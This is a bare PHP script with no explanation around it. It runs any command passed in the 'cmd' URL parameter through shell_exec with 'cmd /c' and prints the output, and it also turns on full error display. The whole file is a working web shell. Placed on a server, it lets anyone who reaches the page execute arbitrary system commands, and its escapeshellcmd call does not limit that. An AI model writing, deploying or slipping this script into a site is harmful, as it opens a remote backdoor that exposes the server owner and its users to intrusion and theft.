<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

if(isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<pre>";
    $output = shell_exec("cmd /c " . escapeshellcmd($cmd));
    echo $output;
    echo "</pre>";
} else {
    echo "No command received.";
}
?>